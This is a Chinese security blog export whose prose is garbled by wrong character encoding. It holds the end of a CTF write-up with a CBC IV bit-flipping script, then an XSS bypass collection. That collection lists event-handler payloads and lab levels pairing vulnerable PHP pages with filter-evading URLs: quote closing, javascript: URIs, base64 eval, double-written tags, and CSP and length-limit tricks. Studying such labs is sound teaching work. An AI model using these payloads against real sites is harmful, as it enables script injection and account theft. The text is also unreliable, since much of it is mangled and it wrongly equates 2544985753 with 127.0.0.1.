//Âª∫ËÆÆÂàùÂ≠¶ËÄÖËá™Â∑±Â§öÂàÜÊûê‰∏ãÈÄªËæëÔºåÂ§öÂÜôÂÜôÔºåÂπ≤ÊÉ≥ÂæàÂ§¥Áñº„ÄÇ Êé•‰∏ãÊù•ÊòØIV‰øÆÊîπÁöÑËÑöÊú¨„ÄÇ # -*- coding:utf8 -*- __author__=&apos;pcat@chamd5.org&apos; from base64 import * import urllib iv=&apos;erUDGVSvM4Kab3ztg8vT8Q%3D%3D&apos; B=b64decode(urllib.unquote(iv)) D=&apos;a:1:{s:2:&quot;id&quot;;s:&apos; A=b64decode(&apos;eFoXA0j/x2Em/bhfgeLzXjI6IjEjIjt9&apos;) iv_new=&apos;&apos; for i in range(16): iv_new+=chr(ord(A[i])^ord(D[i])^ord(B[i])) iv_new=urllib.quote(b64encode(iv_new)) print iv_newÊõøÊç¢ÊéâÂéüÊù•ÁöÑIVÔºåÂç≥ÂèØÊ≠£Â∏∏sqlÊü•ËØ¢„ÄÇ Ëá≥Ê≠§ÔºåÊ≠§È¢òÁöÑcbcÂèçËΩ¨Êàë‰ª¨Â∑≤ÁªèÂÆåÊàê‰∫ÜÔºåÂâ©‰∏ãÁöÑÊ≥®ÂÖ•ÂéüÁêÜ‰∏ÄÊ†∑ÔºåÊ≥®ÂÖ•‰∏çÊòØÊú¨È¢òÁöÑÁõÆÁöÑÔºå‰πüÂ∞±‰∏çÂÜçÂèëÂâ©‰∏ãÁöÑËÑöÊú¨‰∫Ü„ÄÇCBCËøòÊòØË¶ÅËá™Â∑±ÂÜô‰∏Ä‰∏ãÁî®ÂõæÁêÜËß£‰∏Ä‰∏ã„ÄÇ ÂÖ∂‰ΩôÂä†ÂØÜÈóÆÈ¢òÔºåÂêéÁª≠Êàë‰ºöË°•ÂÖÖÂà∞Êú¨Êñá„ÄÇ ÂèÇËÄÉÔºöhttps://www.yourhome.ren/index.php/sec/366.htmlÂèÇËÄÉÔºöÂÆûÈ™åÂêßpcatÂ∏àÂÇÖÁöÑwriteup]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSSÂßøÂäøÂ∞èÈõÜ]]></title>
    <url>%2F2019%2F03%2F04%2FXSS%E5%A7%BF%E5%8A%BF%E5%B0%8F%E9%9B%86%2F</url>
    <content type="text"><![CDATA[ÂâçË®ÄÁî±‰∫éXSSÊîªÂáªÂéüÁêÜÂæàÁÆÄÂçïÔºåÁî®ÁôæÂ∫¶‰∏ÄÊÆµËØùÔºåÊú¨ÊñáÈáçÁÇπÂú®ËÆ∞ÂΩï‰∏Ä‰∫õÁªïËøáÂßøÂäø„ÄÇ XSSÊòØ‰∏ÄÁßçÁªèÂ∏∏Âá∫Áé∞Âú®webÂ∫îÁî®‰∏≠ÁöÑËÆ°ÁÆóÊú∫ÂÆâÂÖ®ÊºèÊ¥ûÔºåÂÆÉÂÖÅËÆ∏ÊÅ∂ÊÑèwebÁî®Êà∑Â∞Ü‰ª£Á†ÅÊ§çÂÖ•Âà∞Êèê‰æõÁªôÂÖ∂ÂÆÉÁî®Êà∑‰ΩøÁî®ÁöÑÈ°µÈù¢‰∏≠„ÄÇÊØîÂ¶ÇËøô‰∫õ‰ª£Á†ÅÂåÖÊã¨HTML‰ª£Á†ÅÂíåÂÆ¢Êà∑Á´ØËÑöÊú¨„ÄÇÊîªÂáªËÄÖÂà©Áî®XSSÊºèÊ¥ûÊóÅË∑ØÊéâËÆøÈóÆÊéßÂà∂‚Äî‚Äî‰æãÂ¶ÇÂêåÊ∫êÁ≠ñÁï•(same origin policy)„ÄÇËøôÁßçÁ±ªÂûãÁöÑÊºèÊ¥ûÁî±‰∫éË¢´È™áÂÆ¢Áî®Êù•ÁºñÂÜôÂç±ÂÆ≥ÊÄßÊõ¥Â§ßÁöÑÁΩëÁªúÈíìÈ±º(Phishing)ÊîªÂáªËÄåÂèòÂæóÂπø‰∏∫‰∫∫Áü•„ÄÇÂØπ‰∫éË∑®Á´ôËÑöÊú¨ÊîªÂáªÔºåÈ™áÂÆ¢ÁïåÂÖ±ËØÜÊòØÔºöË∑®Á´ôËÑöÊú¨ÊîªÂáªÊòØÊñ∞ÂûãÁöÑ‚ÄúÁºìÂÜ≤Âå∫Ê∫¢Âá∫ÊîªÂáª‚ÄúÔºåËÄåJavaScriptÊòØÊñ∞ÂûãÁöÑ‚ÄúShellCode‚Äù„ÄÇ ‰∏™‰∫∫ÁêÜËß£ÔºöXSSËæÉ‰∏∫ÁÆÄÂçïÔºåÁêÜËß£Ëµ∑Êù•‰πüÊØîËæÉÁÆÄÂçïÔºå‰∏ÄÈÉ®ÂàÜ‰ª£Á†ÅÂèØÊéßÔºåÂπ∂‰∏îÊòæÁ§∫Âú®ÁΩëÈ°µ‰∏≠ÔºåÂπ∂‰∏îËÉΩÂ§üËß£ÊûêÔºåÂ∞±ËÉΩÂ§üÈÄ†ÊàêXSSÊºèÊ¥ûÔºå‰∏ÄËà¨Ëß£ÊûêjavascriptÊù•ÈÄ†ÊàêÊîªÂáª„ÄÇ ËΩ¨ÂÖàÁü•Á§æÂå∫‰∏äÂá†‰∏™payloadÔºàÊó†ËøáÊª§ÔºâÂèÇËÄÉÔºöhttps://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet &lt;scirpt&gt; &lt;scirpt&gt;alert(&quot;xss&quot;);&lt;/script&gt; &lt;img&gt; &lt;img src=1 onerror=alert(&quot;xss&quot;);&gt; &lt;input&gt; &lt;input onfocus=&quot;alert(&apos;xss&apos;);&quot;&gt; Á´û‰∫âÁÑ¶ÁÇπÔºå‰ªéËÄåËß¶Âèëonblur‰∫ã‰ª∂ &lt;input onblur=alert(&quot;xss&quot;) autofocus&gt;&lt;input autofocus&gt; ÈÄöËøáautofocusÂ±ûÊÄßÊâßË°åÊú¨Ë∫´ÁöÑfocus‰∫ã‰ª∂ÔºåËøô‰∏™ÂêëÈáèÊòØ‰ΩøÁÑ¶ÁÇπËá™Âä®Ë∑≥Âà∞ËæìÂÖ•ÂÖÉÁ¥†‰∏ä,Ëß¶ÂèëÁÑ¶ÁÇπ‰∫ã‰ª∂ÔºåÊó†ÈúÄÁî®Êà∑ÂéªËß¶Âèë &lt;input onfocus=&quot;alert(&apos;xss&apos;);&quot; autofocus&gt; &lt;details&gt; &lt;details ontoggle=&quot;alert(&apos;xss&apos;);&quot;&gt; ‰ΩøÁî®openÂ±ûÊÄßËß¶Âèëontoggle‰∫ã‰ª∂ÔºåÊó†ÈúÄÁî®Êà∑ÂéªËß¶Âèë &lt;details open ontoggle=&quot;alert(&apos;xss&apos;);&quot;&gt; &lt;svg&gt; &lt;svg onload=alert(&quot;xss&quot;);&gt; &lt;select&gt; &lt;select onfocus=alert(1)&gt;&lt;/select&gt; ÈÄöËøáautofocusÂ±ûÊÄßÊâßË°åÊú¨Ë∫´ÁöÑfocus‰∫ã‰ª∂ÔºåËøô‰∏™ÂêëÈáèÊòØ‰ΩøÁÑ¶ÁÇπËá™Âä®Ë∑≥Âà∞ËæìÂÖ•ÂÖÉÁ¥†‰∏ä,Ëß¶ÂèëÁÑ¶ÁÇπ‰∫ã‰ª∂ÔºåÊó†ÈúÄÁî®Êà∑ÂéªËß¶Âèë &lt;select onfocus=alert(1) autofocus&gt; &lt;iframe&gt; &lt;iframe onload=alert(&quot;xss&quot;);&gt;&lt;/iframe&gt; &lt;video&gt; &lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt; &lt;audio&gt; &lt;audio src=x onerror=alert(&quot;xss&quot;);&gt; &lt;body&gt; &lt;body/onload=alert(&quot;xss&quot;);&gt; Âà©Áî®Êç¢Ë°åÁ¨¶‰ª•ÂèäautofocusÔºåËá™Âä®ÂéªËß¶Âèëonscroll‰∫ã‰ª∂ÔºåÊó†ÈúÄÁî®Êà∑ÂéªËß¶Âèë &lt;body onscroll=alert(&quot;xss&quot;);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt; &lt;textarea&gt; &lt;textarea onfocus=alert(&quot;xss&quot;); autofocus&gt; &lt;keygen&gt; &lt;keygen autofocus onfocus=alert(1)&gt; //‰ªÖÈôêÁÅ´Áãê &lt;marquee&gt; &lt;marquee onstart=alert(&quot;xss&quot;)&gt;&lt;/marquee&gt; Ë°•ÂÖÖ &lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt;XSSÁéØÂ¢Éphpstudy Apache+PHP 5.4 0x00Ê∫êÁ†ÅÔºö &lt;!DOCTYPE html&gt; &lt;html lang=&quot;zh-CN&quot;&gt; &lt;body&gt; &lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot;&gt; &lt;?php ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;); $ss=$_POST[&apos;xss&apos;]; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot; &quot;; echo &quot;&lt;input type=text value=&quot;.$ss.&quot;&gt;&quot;; ?&gt;ÈúÄË¶ÅÈó≠ÂêàÂâçÈù¢ÁöÑÂ∞ñÊã¨Âè∑ÔºåÊâçËÉΩËß£Êûê„ÄÇ http://127.0.0.1/xss.php?xss=&gt;&lt;script&gt;alert(&apos;a&apos;)&lt;/script&gt;0x01Ê∫êÁ†ÅÔºö &lt;!DOCTYPE html&gt; &lt;html lang=&quot;zh-CN&quot;&gt; &lt;body&gt; &lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot;&gt; &lt;?php ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;); $ss=$_GET[&apos;xss&apos;]; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot; &quot;; echo &quot;&lt;input type=text value=&apos;&quot;.$ss.&quot;&apos;&gt;&quot;; ?&gt;Ëøô‰∏ÄÂÖ≥Â¢ûÂä†ÂçïÂºïÂè∑ÔºåÈó≠ÂêàÂâçÈù¢ÁöÑÂ∞ñÊã¨Âè∑ÔºåÂπ∂‰∏îÈó≠ÂêàÂçïÂºïÂè∑ÔºåÊâçËÉΩËß£Êûê„ÄÇ http://127.0.0.1/xss.php?xss=&apos;&gt;&lt;script&gt;alert(&apos;a&apos;)&lt;/script&gt;0x02Ê∫êÁ†ÅÔºö &lt;!DOCTYPE html&gt; &lt;html lang=&quot;zh-CN&quot;&gt; &lt;body&gt; &lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot;&gt; &lt;?php ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;); $ss=$_GET[&apos;xss&apos;]; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot; &quot;; echo &quot;&lt;input type=text value=&apos;&quot;.$ss.&quot;&apos;&gt;&quot;; ?&gt;Ëøô‰∏ÄÂÖ≥Â¢ûÂä†ÂçïÂºïÂè∑ÔºåÈó≠ÂêàÂâçÈù¢ÁöÑÂ∞ñÊã¨Âè∑ÔºåÂπ∂‰∏îÈó≠ÂêàÂçïÂºïÂè∑ÔºåÊâçËÉΩËß£Êûê„ÄÇ http://127.0.0.1/xss.php?xss=&apos;&gt;&lt;script&gt;alert(&apos;a&apos;)&lt;/script&gt;0x03Ê∫êÁ†ÅÔºö &lt;!DOCTYPE html&gt; &lt;html lang=&quot;zh-CN&quot;&gt; &lt;body&gt; &lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot;&gt; &lt;?php ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;); $ss=$_GET[&apos;xss&apos;]; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot; &quot;; echo &quot;&lt;textarea&gt;$ss&lt;/textarea&gt;&quot;; ?&gt;Ëøô‰∏ÄÂÖ≥ÈúÄË¶ÅÈó≠ÂêàtextareaÊ†áÁ≠æ„ÄÇ http://127.0.0.1/xss.php?xss=&lt;/textarea&gt;&lt;script&gt;alert(&apos;a&apos;)&lt;/script&gt;0x04Ê∫êÁ†ÅÔºö &lt;!DOCTYPE html&gt; &lt;html lang=&quot;zh-CN&quot;&gt; &lt;body&gt; &lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot;&gt; &lt;?php ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;); $ss=$_GET[&apos;xss&apos;]; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot; &quot;; echo &quot;&lt;xmp&gt;$ss&lt;/xmp&gt;&quot;; ?&gt;Ëøô‰∏ÄÂÖ≥ÈúÄË¶ÅÈó≠ÂêàxmpÊ†áÁ≠æÔºåxmpÊ†áÁ≠æ‰ºöÂ∞ÜÊ†áÁ≠æÂÜÖÁöÑ‰ªª‰Ωï‰ª£Á†Å‰∏çÂÅö‰ªª‰ΩïÂ§ÑÁêÜÁöÑÊòæÁ§∫Âá∫Êù•„ÄÇ http://127.0.0.1/xss.php?xss=&lt;/xmp&gt;&lt;script&gt;alert(&apos;a&apos;)&lt;/script&gt;0x05Ê∫êÁ†ÅÔºö &lt;!DOCTYPE html&gt; &lt;html lang=&quot;zh-CN&quot;&gt; &lt;body&gt; &lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot;&gt; &lt;div&gt; &lt;?php ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;); $ss=$_GET[&apos;xss&apos;]; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot; &quot;; $ss=preg_replace(&quot;/&gt;/&quot;,&quot;&amp;gt&quot;,$ss); $ss=preg_replace(&quot;/&lt;/&quot;,&quot;&amp;lt&quot;,$ss); echo &apos;&lt;input type=&quot;text&quot; value=&quot;&apos;.$ss.&apos;&quot;&gt;&apos;; ?&gt;Ëøô‰∏ÄÂÖ≥Â∞ÜÂ∞ñÊã¨Âè∑ËøõË°å‰∫ÜÂÆû‰ΩìÂåñÔºåÊú¨ÊâìÁÆó‰ΩøÁî®jsÊù•ËøõË°åÂÆû‰ΩìÁºñÁ†ÅÔºå‰ΩÜÊòØÂÜô‰∫ÜÂçäÂ§©Ê≤°ÂÜôÂá∫Êù•ÔºÅphpÂ∞ÜÂ∞±Áî®Âêß„ÄÇ ÈÄöÂ∏∏ÊÉÖÂÜµ‰∏ãÂÆû‰ΩìÂåñÂü∫Êú¨ÂèØ‰ª•Èò≤Âæ°ÊâÄÊúâxssÔºå‰ΩÜÊòØÂú®ÁâπÂÆöÊÉÖÂÜµ‰∏ãÂπ∂‰∏çÈúÄË¶ÅÂ∞ñÊã¨Âè∑ÔºåÈÄöËøáautofocusÂ±ûÊÄßÂéªËß¶Âèëonfocus‰∫ã‰ª∂ http://127.0.0.1/xss.php?xss=&quot; autofocus onfocus=&quot;alert(&apos;a&apos;)0x06Ê∫êÁ†ÅÔºö &lt;!DOCTYPE html&gt; &lt;html lang=&quot;zh-CN&quot;&gt; &lt;body&gt; &lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot;&gt; &lt;div&gt; &lt;?php ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;); $ss=$_GET[&apos;xss&apos;]; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot; &quot;; $ss=preg_replace(&apos;/&quot;/&apos;,&quot;&amp;quot&quot;,$ss); echo &apos;&lt;iframe src=&quot;&apos;.$ss.&apos;&quot;&gt;&lt;/iframe&gt;&apos;; ?&gt;Ëøô‰∏ÄÂÖ≥ËøáÊª§‰∫ÜÂèåÂºïÂè∑Ôºå‰ΩÜÊòØÂú®ÂèåÂºïÂè∑ÂÜÖÂèØ‰ª•Âà©Áî®javascript‰º™ÂçèËÆÆÊù•Âä†ËΩΩscriptËÑöÊú¨„ÄÇ http://127.0.0.1/xss.php?xss=javascript:alert(1)0x07Ê∫êÁ†ÅÔºö &lt;?php ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;); $ss=$_GET[&apos;xss&apos;]; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot; &quot;; $ss=preg_replace(&apos;/windows/&apos;,&quot;&quot;,$ss); $ss=preg_replace(&apos;/document/&apos;,&quot;&quot;,$ss); $ss=preg_replace(&apos;/img/&apos;,&quot;&quot;,$ss); $ss=preg_replace(&apos;/script/&apos;,&quot;&quot;,$ss); $ss=preg_replace(&apos;/&quot;/&apos;,&quot;&amp;quot&quot;,$ss); $ss=preg_replace(&apos;/onerror/&apos;,&quot;&quot;,$ss); echo &quot;&lt;textarea&gt;$ss&lt;/textarea&gt;&quot;; ?&gt;Ëøô‰∏ÄÂÖ≥ËøáÊª§‰∫ÜÂæàÂ§öÊ†áÁ≠æÔºåÂèåÂºïÂè∑‰πüË¢´ËøáÊª§‰∫ÜÔºåÂÅáË£ÖËØ•ËøáÊª§ÁöÑÈÉΩËøáÊª§‰∫ÜÔºåÂîØÁã¨svgÊ≤°ËøáÊª§„ÄÇÈÇ£Â∞±Áõ∏ÂΩì‰∫é‰ªÄ‰πàÈÉΩÊ≤°ËøáÊª§‰∫Ü„ÄÇ http://127.0.0.1/xss.php?xss=&lt;/textarea&gt;&lt;svg onload=eval(atob(&apos;YWxlcnQoMSk=&apos;))&gt;Ê≥®ÈáäÔºöonload ‰∫ã‰ª∂‰ºöÂú®È°µÈù¢ÊàñÂõæÂÉèÂä†ËΩΩÂÆåÊàêÂêéÁ´ãÂç≥ÂèëÁîüÔºåeval() ÂáΩÊï∞ÂèØËÆ°ÁÆóÊüê‰∏™Â≠óÁ¨¶‰∏≤ÔºåÂπ∂ÊâßË°åÂÖ∂‰∏≠ÁöÑÁöÑ JavaScript ‰ª£Á†ÅÔºåatobËß£Á†Åbase64„ÄÇ Èó≠ÂêàÂâçÈù¢Ê†áÁ≠æÔºåÂÜçÁî®svgÊ†áÁ≠æÔºåatob‰∏≠ÁöÑbase64ÁºñÁ†ÅÁªïËøá‰∏ÄÂàáËøáÊª§ÔºåÂè™Ë¶ÅsvgÊ≤°ËøáÊª§„ÄÇ 0x08Ê∫êÁ†ÅÔºö header(&quot;Content-Security-Policy: script-src &apos;self&apos; &apos;unsafe-inline&apos;; frame-src &apos;self&apos;;&quot;); ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;); $ss=$_GET[&apos;xss&apos;]; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot; &quot;; $ss=preg_replace(&apos;/windows/&apos;,&quot;&quot;,$ss); $ss=preg_replace(&apos;/document/&apos;,&quot;&quot;,$ss); $ss=preg_replace(&apos;/img/&apos;,&quot;&quot;,$ss); $ss=preg_replace(&apos;/script/&apos;,&quot;&quot;,$ss); $ss=preg_replace(&apos;/&quot;/&apos;,&quot;&amp;quot&quot;,$ss); echo &quot;&lt;textarea&gt;$ss&lt;/textarea&gt;&quot;; ?&gt;Ëøô‰∏ÄÂÖ≥È¢ÑÂä†ËΩΩÁªïËøáxssÔºåÂèÇËÄÉÊñáÁ´†Á¨¨‰∏ãÈù¢ÈìæÊé•ÁöÑÁ¨¨ÂçÅ‰∫åÂÖ≥ÔºåËøôÂÖ≥Âä†‰∫Ü‰∏™cspÂÜÖÂÆπÂÆâÂÖ®Á≠ñÁï•„ÄÇ CSPÊåáÁöÑÊòØÂÜÖÂÆπÂÆâÂÖ®Á≠ñÁï•Ôºå‰∏∫‰∫ÜÁºìËß£ÂæàÂ§ß‰∏ÄÈÉ®ÂàÜÊΩúÂú®ÁöÑË∑®Á´ôËÑöÊú¨ÈóÆÈ¢òÔºåÊµèËßàÂô®ÁöÑÊâ©Â±ïÁ®ãÂ∫èÁ≥ªÁªüÂºïÂÖ•‰∫ÜÂÜÖÂÆπÂÆâÂÖ®Á≠ñÁï•ÔºàCSPÔºâÁöÑ‰∏ÄËà¨Ê¶ÇÂøµ„ÄÇËøôÂ∞ÜÂºïÂÖ•‰∏Ä‰∫õÁõ∏ÂΩì‰∏•Ê†ºÁöÑÁ≠ñÁï•Ôºå‰ºö‰ΩøÊâ©Â±ïÁ®ãÂ∫èÂú®ÈªòËÆ§ÊÉÖÂÜµ‰∏ãÊõ¥Âä†ÂÆâÂÖ®ÔºåÂºÄÂèëËÄÖÂèØ‰ª•ÂàõÂª∫Âπ∂Âº∫Âà∂Â∫îÁî®‰∏Ä‰∫õËßÑÂàôÔºåÁÆ°ÁêÜÁΩëÁ´ôÂÖÅËÆ∏Âä†ËΩΩÁöÑÂÜÖÂÆπ„ÄÇ CSP ‰ª•ÁôΩÂêçÂçïÁöÑÊú∫Âà∂ÂØπÁΩëÁ´ôÂä†ËΩΩÊàñÊâßË°åÁöÑËµÑÊ∫êËµ∑‰ΩúÁî®„ÄÇÂú®ÁΩëÈ°µ‰∏≠ÔºåËøôÊ†∑ÁöÑÁ≠ñÁï•ÈÄöËøá HTTP Â§¥‰ø°ÊÅØÊàñËÄÖ meta ÂÖÉÁ¥†ÂÆö‰πâ„ÄÇCSPËôΩÁÑ∂Êèê‰æõ‰∫ÜÂº∫Â§ßÁöÑÂÆâÂÖ®‰øùÊä§Ôºå‰ΩÜÊòØ‰ªñ‰πüÈÄ†Êàê‰∫ÜÂ¶Ç‰∏ãÈóÆÈ¢òÔºöEvalÂèäÁõ∏ÂÖ≥ÂáΩÊï∞Ë¢´Á¶ÅÁî®„ÄÅÂÜÖÂµåÁöÑJavaScript‰ª£Á†ÅÂ∞Ü‰∏ç‰ºöÊâßË°å„ÄÅÂè™ËÉΩÈÄöËøáÁôΩÂêçÂçïÊù•Âä†ËΩΩËøúÁ®ãËÑöÊú¨„ÄÇ 0x9Ê∫êÁ†ÅÔºö &lt;?php header(&quot;Content-Security-Policy: script-src &apos;self&apos; &apos;unsafe-inline&apos;; frame-src &apos;self&apos;;&quot;); ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;); $ss=$_GET[&apos;xss&apos;]; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot; &quot;; $ss=preg_replace(&quot;/&apos;/&quot;,&quot;\&apos;&quot;,$ss); echo &quot;&lt;script&gt;console.log(&apos;&quot;.$ss.&quot;&apos;)&lt;/script&gt;&quot;; ?&gt;ËøôÈÅìÈ¢òÊñúÁ∫øË¢´ËΩ¨‰πâ‰∫ÜÔºåÂêéÈù¢ÁöÑÊã¨Âè∑ÂíåÂçïÂºïÂè∑Áî®Ê≥®ÈáäÁ¨¶Ôºàscript‰∏≠//Ê≥®ÈáäÔºâÊ≥®ÈáäÊéâÔºåÂâçÈù¢ÂçïÂºïÂè∑ÂÜçÂä†‰∏Ä‰∏™ÂèçÊñúÁ∫øËΩ¨‰πâÔºå http://127.0.0.1/xss.php?xss=1\&apos;);alert(1);//0x10Ê∫êÁ†ÅÔºö &lt;?php #&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; img-src https://*; child-src &apos;none&apos;;&quot;&gt; header(&quot;Content-Security-Policy: script-src &apos;self&apos; &apos;unsafe-inline&apos;; frame-src &apos;self&apos;;&quot;); ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;); $ss=$_GET[&apos;xss&apos;]; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot; &quot;; $ss=preg_replace(&quot;/script/&quot;,&quot;&quot;,$ss); echo &quot;&lt;textarea&gt;$ss&lt;/textarea&gt;&quot;; ?&gt;Ëøô‰∏ÄÂÖ≥Èó≠ÂêàÊ†áÁ≠æÔºåscriptËøáÊª§‰∏∫Á©∫ÔºåÂèåÂÜôÁªïËøá„ÄÇ http://127.0.0.1/xss.php?xss=&lt;/textarea&gt;&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;0x11Ê∫êÁ†ÅÔºö &lt;?php ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;); $ss=$_GET[&apos;xss&apos;]; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot; &quot;; header(&quot;X-XSS-Protection: 1; mode=block&quot;); $ss=preg_replace(&quot;/script/&quot;,&quot;&quot;,$ss); echo &quot;$ss&quot;; ?&gt;ËøáÊª§‰∫ÜscriptÂèØ‰ª•Â§ßÂ∞èÂÜôÁªïËøáÔºå‰ΩÜÊòØÂ§ö‰∫Ü‰∏Ä‰∏™headerÂ§¥X-XSS-ProtectionÔºåËøô‰∏™Â§¥Êúâ‰∏â‰∏™ÂÄº„ÄÇÂàÜÂà´‰∏∫ 0Ôºö Ë°®Á§∫ÂÖ≥Èó≠ÊµèËßàÂô®ÁöÑXSSÈò≤Êä§Êú∫Âà∂ 1ÔºöÂà†Èô§Ê£ÄÊµãÂà∞ÁöÑÊÅ∂ÊÑè‰ª£Á†ÅÔºå Â¶ÇÊûúÂìçÂ∫îÊä•Êñá‰∏≠Ê≤°ÊúâÁúãÂà∞X-XSS-Protection Â≠óÊÆµÔºåÈÇ£‰πàÊµèËßàÂô®Â∞±ËÆ§‰∏∫X-XSS-ProtectionÈÖçÁΩÆ‰∏∫1ÔºåËøôÊòØÊµèËßàÂô®ÁöÑÈªòËÆ§ËÆæÁΩÆ 1; mode=blockÔºöÂ¶ÇÊûúÊ£ÄÊµãÂà∞ÊÅ∂ÊÑè‰ª£Á†ÅÔºåÂú®‰∏çÊ∏≤ÊüìÊÅ∂ÊÑè‰ª£Á†Åscript‰ºöË¢´Êã¶Êà™Ôºå‰ΩøÁî®ÂèåÂÜôÂèØ‰ª•ÁªïËøáÔºåÂèØËÉΩÊ†πÊçÆ‰∏çÂêåÊµèËßàÂô®ÔºåÁÅ´Áãê‰∏≠Ëøô‰∏™ËØ∑Ê±ÇÂ§¥Ê≤°‰ΩúÁî®ÔºåÂéüÊñáËØ¥Ë¶ÅÊç¢Â§ßÂ∞èÂÜôÔºåÊó†ÂèØÂéöÈùûÔºåËøôÈáå‰∏çÊç¢Â§ßÂ∞èÂÜô‰πüÂèØ‰ª•„ÄÇ http://127.0.0.1/xss.php?xss=&lt;ScrscriptiPt&gt;alert(&apos;a&apos;)&lt;/ScrscriptiPt&gt;0x12Ê∫êÁ†ÅÔºö &lt;!DOCTYPE html&gt; &lt;html lang=&quot;zh-CN&quot;&gt; &lt;body&gt; &lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot;&gt; &lt;div&gt; &lt;?php ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;); $ss=$_GET[&apos;xss&apos;]; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot; &quot;; if(strlen($ss)&gt;10) { $ss=substr(&quot;$ss&quot;,0,40); } #$ss=preg_replace(&quot;/script/&quot;,&quot;&quot;,$ss); echo &quot;$ss&quot;; ?&gt;Ëøô‰∏ÄÂÖ≥ÈïøÂ∫¶Ë¢´ÈôêÂà∂ÔºåÂèØ‰ª•Â∞ΩÂäõ‰ΩøÁî®Áü≠ÁöÑÈìæÊé•,ÁΩëÁ´ôÂèØ‰ª•Ê†πÊçÆIPËΩ¨Êç¢ÂçÅËøõÂà∂„ÄÇ 2544985753=127.0.0.1 http‰πü‰∏çÁî®ËæìÂÖ•ÔºåÂèåÊñúÁ∫øÂç≥ÂèØË∑≥ËΩ¨Êñ∞Á™óÂè£„ÄÇÁ©∫Ê†ºÁ≠âË¢´ËøáÊª§Áî®/ÊõøÊç¢„ÄÇ http://127.0.0.1/xss.php?xss=&lt;svg/onload=window.open(&apos;//2544985753&apos;)&gt;ÊàñËÄÖ http://127.0.0.1/xss.php?xss=&lt;svg/onload=eval(location.hash.slice(1))&gt;#alert(1) //Ê≥®Ôºö#ÂêéÈù¢‰∏çÁÆóÂÖ•ÈïøÂ∫¶ÂèÇËÄÉÂéüÊñáÁöÑÁ¨¨25ÂÖ≥Áü≠Âá∫Êñ∞È´òÂ∫¶„ÄÇ 0x13Ê∫êÁ†ÅÔºö 